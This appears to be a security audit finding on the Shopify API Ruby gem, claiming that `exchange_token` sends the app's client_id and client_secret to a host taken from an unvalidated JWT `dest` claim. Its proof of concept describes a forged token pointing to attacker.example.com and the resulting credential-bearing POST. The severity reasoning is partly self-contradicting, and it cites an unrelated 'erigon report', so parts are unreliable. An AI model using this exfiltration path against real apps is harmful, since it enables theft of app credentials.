Found a clear analog: `client_credentials`, `refresh_token`, and `migrate_to_expiring_token` all validate `shop` via `Utils::ShopValidator.sanitize!` before sending the app's `client_secret` to a host derived from it. But `exchange_token` in `lib/shopify_api/auth/token_exchange.rb` derives the target host directly from `jwt_payload.shop` (the `dest` claim) without ever passing it through `ShopValidator`, and `JwtPayload` itself never validates that `dest`/`iss` are Shopify-owned domains.

### Title
Unvalidated JWT `dest` claim used to build the OAuth token endpoint, allowing client_secret exfiltration via SSRF - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` extracts `shop` from an attacker-suppliable JWT (`session_token`) and uses it, unsanitized, as the host to which it POSTs the app's `client_id`/`client_secret`. Every other credential-sending flow in this gem (`client_credentials.rb`, `refresh_token.rb`, `migrate_to_expiring_token`) explicitly calls `Utils::ShopValidator.sanitize!` on the `shop` value before using it to build the HTTP request host, but `exchange_token` never does.

### Finding Description
`exchange_token` decodes the session token with `ShopifyAPI::Auth::JwtPayload.new(session_token)` and takes `dest_shop = jwt_payload.shop`: [1](#0-0) 

`JwtPayload#shop` simply strips `"https://"` from the `dest` claim with no domain allow-list check: [2](#0-1) 

The only cryptographic check on the JWT is the HMAC signature verifying `aud == Context.api_key` and that it was signed with `Context.api_secret_key`: [3](#0-2) 

Crucially, the signature is verified using the gem's own `api_secret_key` (`Context.api_secret_key`), which is a value the **app itself controls and uses to sign/encode the token**, not a secret only Shopify knows in this analog. Nowhere in this gem's decode path is `dest`/`iss` checked against `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. Compare to the sibling flows that use `Utils::ShopValidator.sanitize!(shop)`: [4](#0-3) [5](#0-4) [6](#0-5) 

`exchange_token` builds `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)` directly from the unsanitized claim and hands it to `Clients::HttpClient`, whose base path becomes `https://#{shop}/admin/oauth`, the destination that receives `client_id`/`client_secret` in the POST body: [7](#0-6) 

The broken identity binding is: **the host that receives `client_secret` (`dest_shop`, taken from the token's `dest` claim) is not equal to the host validated as a genuine Shopify shop domain (`Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`)**. This exactly matches the report's bug class — "a host validated versus the host that receives the access token or `client_secret`" — with the underlying mechanism being an unvalidated attacker-controlled field (the JWT `dest` claim) trusted for a security-sensitive purpose without independent domain validation, analogous to the untrusted-input parsing issue in the erigon report.

### Impact Explanation
If an app calls `exchange_token` with a session token whose `dest` claim is attacker-controlled (e.g., a malicious or compromised frontend forges/relays a token, or the app is embedded and any JS on the page can request a session token from App Bridge but a malicious extension/proxy substitutes the `dest`), the gem will issue a server-side POST containing `client_id` and `client_secret` to an arbitrary attacker-chosen host. This is SSRF carrying the app's credentials — High severity per the rules, and depending on deployment could allow full credential exfiltration.

### Likelihood Explanation
Exploitability depends on whether an attacker can influence the `dest` claim of a token that still passes signature verification with the app's own `Context.api_secret_key`. In the strict Shopify OAuth model, App Bridge–issued tokens are signed with Shopify's own key material tied to the shop, and `Context.api_secret_key` here is the app's registered secret — so under normal operation a token with a forged `dest` would fail Shopify-side issuance, not this gem's check. However, within this gem's own trust boundary, there is no independent enforcement that `dest` is a myshopify/spin/shop.dev domain; the code relies entirely on the caller having received a legitimately-issued token. Given other flows in the same file explicitly re-validate `shop` with `ShopValidator.sanitize!` even after other authorization checks, the omission here is a deviation from the gem's own defense-in-depth pattern, indicating the missing check is not intentional.

### Recommendation
Add `dest_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)` (or equivalent) in `exchange_token` before constructing `shop_session`/`base_path`, mirroring `client_credentials.rb`, `refresh_token.rb`, and `migrate_to_expiring_token`. Consider adding the same validation directly inside `JwtPayload#shop`/`JwtPayload#initialize` so all consumers benefit automatically.

### Proof of Concept
1. Obtain or construct a JWT signed with the app's own `api_secret_key` (as used by `Context.api_secret_key`) with `dest: "https://attacker.example.com"` and a valid `aud` matching `Context.api_key`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_token, requested_token_type: ...)`.
3. Observe that `JwtPayload.new` accepts the token (only `aud` is checked against `Context.api_key`; `dest` is never validated against `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`).
4. The gem issues `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` in plaintext, exfiltrating them to the attacker-controlled host.
